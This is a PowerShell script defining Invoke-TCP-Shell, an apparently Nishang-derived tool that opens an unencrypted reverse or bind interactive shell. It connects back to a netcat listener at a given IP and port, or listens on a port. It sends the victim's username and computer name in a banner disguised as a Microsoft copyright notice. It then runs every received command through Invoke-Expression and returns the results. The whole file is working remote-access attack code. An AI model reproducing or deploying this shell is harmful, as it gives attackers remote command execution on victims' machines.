function Invoke-TCP-Shell
{ 

<#

.SYNOPSIS
PowerShell TCP Reverse or Bind interactive shell. Unencrypted.

.DESCRIPTION
This script is able to connect to a standard netcat listening on a TCP port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific TCP port.


.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-TCP-Shell -Reverse -IPAddress 192.168.254.226 -Port 8080
Above shows an example of an interactive PowerShell reverse connect shell. 

.EXAMPLE
PS > Invoke-TCP-Shell -Bind -Port 8080
Above shows an example of an interactive PowerShell bind connect shell. 

.EXAMPLE
PS > Invoke-TCP-Shell -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 8080
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
https://github.com/ahhh/PSSE/blob/master/Invoke-TCP-Shell.ps1
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1


#>   
      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $IPv6,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

        
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
			# If IPV6 Address
            # Regex from http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses
            if ($IPAddress -match "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))")
            {
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
            }
            else #IPv4 Address
            {
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
            }
        }

        #Bind to the provided port if Bind switch is used.
       if ($Bind)
        {
            if ($IPv6)
            {
                $listener = New-Object System.Net.Sockets.TcpListener($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
				$listener.start()    
				$client = $listener.AcceptTcpClient()
            }
            else # IPv4
            {
				$listener = [System.Net.Sockets.TcpListener]$Port
				$listener.start()    
				$client = $listener.AcceptTcpClient()
            }
        
        }

        $stream = $client.GetStream()
		[byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername in ghetto banner
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
        $stream.Write($sendbytes,0,$sendbytes.Length)
    
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i)
            try
            {
                #Execute the command on the target.
                $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }

            $sendback = $result +  'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback = $sendback + $x

            #Send results back
            $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback)
            $stream.Write($sendbytes, 0, $sendbytes.Length)
			$stream.Flush()
        }
        $client.Close()
		if ($listener)
		{
			$listener.Stop()
		}
    }
    catch
    {
        Write-Warning "Warning! Danger Will Robinson." 
        Write-Error $_
    }
}
